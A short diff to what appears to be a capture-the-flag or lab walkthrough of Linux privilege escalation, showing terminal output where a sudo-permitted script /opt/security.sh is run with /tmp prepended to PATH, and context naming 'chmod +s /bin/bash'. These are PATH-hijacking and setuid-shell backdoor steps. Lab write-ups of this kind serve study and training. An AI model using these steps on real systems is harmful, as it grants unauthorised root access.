@@ -262,9 +262,6 @@ chmod +s /bin/bash
 /tmp:/usr/local/bin:/usr/bin:/bin:/usr/games
 -bash-5.1$ sudo -u 'root' PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games /opt/security.sh
 Enter the string to encode:
-^C
--bash-5.1$ sudo -u 'root' PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games /opt/security.sh
-Enter the string to encode:
 as
 Original string: as
 Encoded string: 
